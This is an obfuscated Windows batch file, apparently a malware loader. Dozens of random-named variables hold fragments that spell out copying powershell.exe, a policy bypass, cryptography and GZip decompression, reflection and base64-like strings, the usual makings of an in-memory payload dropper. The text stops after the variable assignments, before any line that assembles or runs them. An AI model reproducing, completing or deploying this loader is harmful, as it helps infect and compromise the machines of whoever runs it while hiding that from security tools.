@echo off
set "HbFKvFHRnC= /"
set "FdjpIBtMbk=do"
set "ReLmHutvCx=we"
set "uhiamBtMbg=co"
set "iFoWSsQKOz=in"
set "EMJQXKWeIL=he"
set "kjJgIhOTYE= C"
set "cKloczcnze=he"
set "RSZCTDXlwZ=y "
set "gmEQSRXtor=py"
set "SCHlGkybre=nd"
set "fdsftqweGa=ll"
set "MzOxuyoRuj=ow"
set "IvOnrevUpW=1."
set "JvBVrCqJjJ=Wi"
set "xoNQsfDBoM=0\"
set "BJmlnHPzMm=32"
set "TpTXxalMMI=ll"
set "VBPKCdELlJ=rs"
set "srBDPGmzbG=\v"
set "iHYJIPIOPf=s\"
set "iWHHdboaBg=rS"
set "QfKoLiaMgk=Sy"
set "lGYpSkGdAS=st"
set "QyNZRctIZJ=.e"
set "xCLkYCIJRy=\W"
set "nyoZAlDXDQ=em"
set "vhrnuLNdbY=ws"
set "LHYMvJIquE=:\"
set "IyUroNmOZE=xe"
set "yxcbdJofOo=we"
set "EjtBNmkfar=po"
set "CUgeHWvqtV=Po"
set "tSIxLJQtaV= %~dp0"
set "fNKNadNDbp=cd"
set "frzEngoOdA= [st"
set "SzrKWaxkuk=gnir"
set "AiDyNXrgLt=Secu"
set "KlahsleXaw=ciCb"
set "ILpuITioZI=ewLi"
set "hvHDPtyWWK=yste"
set "eoVsALbFED='txe"
set "LFmSyrdRum=pStr"
set "JGGuMiCsWc=.Dis"
set "OpXfJkPpQU=ss -"
set "iimqXlxJsQ=m.IO"
set "UJrfCMLtlR=TllA"
set "izsasPWewK=$GDB"
set "QkbBfWyntY=flec"
set "MrvKqLZXdk=hSMw"
set "rbGZWyNdZm=rity"
set "jRRFtnyTgr=m.IO"
set "RRXvKlAkaj=VDQ."
set "nDNAKteoqM=pose"
set "BdxFgWFJGL='[-1"
set "iXdoBKNnHV=stem"
set "nOmpBrfDmP=null"
set "MUnnaTuDUr=am;$"
set "gUVqJnurCu=form"
set "nijVmJxFUO=;$OU"
set "xAmSPyhDrX=Comp"
set "YaNuUWDPOG=('da"
set "CkFeGMxVoh=.Cop"
set "uOSomJwHtk=Ioau"
set "cCUaYlZkjH=.GZi"
set "nmaEEgQjCs=ct S"
set "BTMYKxcSfB=se()"
set "AwtpWsJizp===')"
set "UrZywPtWqs=orF'"
set "VuVLvPwnxx=$QQq"
set "dqzMvWfnYK=)))"
set "QDfGvPlALT=oL'["
set "uqvpUniREX=Gg ="
set "lssNrvATHt=R5jf"
set "HluEkdaofn=$hSM"
set "CoJDqSYaum=em.I"
set "sPwOMCxgHH= = $"
set "TNOEIMExYu=;$QV"
set "idYNnkyBTz=();$"
set "veeqOpVzuU=6esa"
set "qmqOrrZJRi= New"
set "eBruUIivaL=-Obj"
set "GTiMEpswRE=[IO."
set "URzqRMhVaG=..-1"
set "UVuFRLpRjK=Wzu."
set "piiGhtDbqt=bypa"
set "hmrkOVrVkA=-joi"
set "XxpnmMqMCB=.Key"
set "tdTOVPZWEd=CuSj"
set "yBBawcEINb==');"
set "SWBsIMlCNx=Secu"
set "hiBGxcdGFU=]::("
set "tWXpBpVkTR=ck($"
set "koeCWxSETY=ptog"
set "JGWGZxTCwT=dV1k"
set "nXnEZZWxXQ=wo ="
